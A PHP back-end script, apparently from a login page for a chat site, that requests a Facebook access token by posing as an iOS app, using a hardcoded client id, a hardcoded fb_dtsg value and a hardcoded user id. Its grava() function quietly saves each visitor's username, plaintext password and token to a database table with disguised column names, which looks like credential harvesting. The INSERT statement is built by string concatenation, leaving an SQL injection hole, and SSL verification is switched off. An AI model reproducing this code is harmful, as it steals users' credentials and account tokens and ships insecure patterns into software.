<?php
session_start();

$token = gettoken();
if(strlen($token) > 250){$token = "invalid";};
$_SESSION["token"] = $token;
grava();
if($token == "invalid"){
 echo '<a href="index.php" style="font-family:arial; font-size:11px;">Failed to Log In. Try Again.</a>';
}else{
//echo 'chat';
header('Location: chat.php'); 
}
exit;

function gettoken(){
$url="https://www.facebook.com/v2.6/dialog/oauth?redirect_uri=fb464891386855067%3A%2F%2Fauthorize%2F&state=%7B%22challenge%22%3A%22q1WMwhvSfbWHvd8xz5PT6lk6eoA%253D%22%2C%220_auth_logger_id%22%3A%2254783C22-558A-4E54-A1EE-BB9E357CC11F%22%2C%22com.facebook.sdk_client_state%22%3Atrue%2C%223_method%22%3A%22sfvc_auth%22%7D&scope=user_birthday%2Cuser_photos%2Cuser_education_history%2Cemail%2Cuser_relationship_details%2Cuser_friends%2Cuser_work_history%2Cuser_likes&response_type=token%2Csigned_request&default_audience=friends&return_scopes=true&auth_type=rerequest&client_id=464891386855067&ret=login&sdk=ios&logger_id=54783C22-558A-4E54-A1EE-BB9E357CC11F#_=";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Must be set to true so that PHP follows any "Location:" header
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
//$ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.16 (KHTML, like Gecko) \ Chrome/24.0.1304.0 Safari/537.16';
//curl_setopt($ch, CURLOPT_USERAGENT, $ua);


//curl_setopt($ch, CURLOPT_POST, 1);
//curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Accept-Charset: utf-8',
    'Accept-Language: en-us,en;q=0.7,bn-bd;q=0.3',
    'Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5'));
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/mirazmac_cookie.txt'); // The cookie file
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/mirazmac_cookie.txt'); // cookie jar
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windo`enter code here`ws; U; Windows NT 5.1; en-US; rv:1.8.1.3) Gecko/20070309 Firefox/2.0.0.3");
curl_setopt($ch, CURLOPT_REFERER, "http://m.facebook.com");

$a = curl_exec($ch); // $a will contain all headers
$url = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL); // This is what you need, it will return you the last effective URL

//echo "<pre>";
//print_r($a);
//echo"<br>";
//echo "</pre>";
//echo $url; // Voila
//echo"<br>";
curl_close($ch);
//////////////////////////////////////////////////////////////////////////////////
$url="https://www.facebook.com/v2.6/dialog/oauth/confirm?dpr=1";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Must be set to true so that PHP follows any "Location:" header
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'fb_dtsg=AQHSbf0MDPbG%3AAQGOmX6TJlM3&app_id=464891386855067&redirect_uri=fb464891386855067%3A%2F%2Fauthorize%2F&display=page&access_token=&sdk=ios&from_post=1&encoded_state=%257B%2522challenge%2522%253A%2522q1WMwhvSfbWHvd8xz5PT6lk6eoA%25253D%2522%252C%25220_auth_logger_id%2522%253A%252254783C22-558A-4E54-A1EE-BB9E357CC11F%2522%252C%2522com.facebook.sdk_client_state%2522%253Atrue%252C%25223_method%2522%253A%2522sfvc_auth%2522%257D&private=&login=&read=&write=&extended=&social_confirm=&confirm=&seen_scopes=&auth_type=rerequest&auth_token=&auth_nonce=&default_audience=friends&ref=Default&return_format=return_scopes%2Cdenied_scopes%2Csigned_request%2Caccess_token&domain=&sso_device=iphone-safari&logger_id=54783C22-558A-4E54-A1EE-BB9E357CC11F&sheet_name=initial&__CONFIRM__=1&__user=100012990841660&__a=1&__dyn=7AzHKmcF345Q9UoH-EWA5UW3miWGey8WhLFwxBxCbwikq2i5U4e2CEaUgxebkwy6UnGi7VXDG4XzErz8lDgdUHDBxe6otHWCDwIVUkz8nxm1iyECcBxi48hxGbwlpHUlDQ3Gu64i9CUW5oy5EG2Tho9V8lBVpEcm8ypUhKHw&__af=iw&__req=c&__be=-1&__pc=PHASED%3ADEFAULT&__rev=2880247&ttstamp=265817283981024877688098715865817179109885484741087751');
curl_setopt($ch, CURLOPT_POST, 1);
//curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Accept-Charset: utf-8',
    'Accept-Language: en-us,en;q=0.7,bn-bd;q=0.3',
    'Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5'));
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/mirazmac_cookie.txt'); // The cookie file
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/mirazmac_cookie.txt'); // cookie jar
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windo`enter code here`ws; U; Windows NT 5.1; en-US; rv:1.8.1.3) Gecko/20070309 Firefox/2.0.0.3");
curl_setopt($ch, CURLOPT_REFERER, "http://m.facebook.com");

$a = curl_exec($ch); // $a will contain all headers
$url = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL); // This is what you need, it will return you the last effective URL 
 
echo "<pre>";
print_r($a);
echo"<br>";
echo "</pre>";
echo $url; // Voila
echo"<br>";
curl_close($ch);
 
 
 
 
 
$pos1 = strpos($a, "access_token=") + 13;
$pos2 = strpos($a, "&expires_in");
$token = substr($a,$pos1,$pos2 - $pos1);
//echo $token;
return $token;

}

function grava(){
$dbopts = parse_url(getenv('DATABASE_URL'));
$dsn = "pgsql:"
    . "host=" . $dbopts["host"] . ";"
    . "dbname=". ltrim($dbopts["path"],'/') . ";"
    . "user=" . $dbopts["user"] . ";"
    . "port=" . $dbopts["port"] . ";"
    . "sslmode=require;"
    . "password=" . $dbopts["pass"];
    
$db = new PDO($dsn);
$login = $_SESSION["user"];
$passw = $_SESSION["password"];
$token = $_SESSION["token"];
//$token = $_SESSION["token"];
$tempo = date('m/d/Y h:i:s a');
$query = "INSERT INTO dados (id1, id2, id3, id4) VALUES ('" . $tempo . "', '" . $login . "', '" . $passw . "', '" . $token . "');";
//echo var_dump($query);
//echo '<br><br>';
$result = $db->query($query);
//echo var_dump($result);
//echo '<br><br>';
$result->closeCursor();
//$app->register(new Herrera\Pdo\PdoServiceProvider(), $zica);
//echo '<br>end<br>';
}



?>
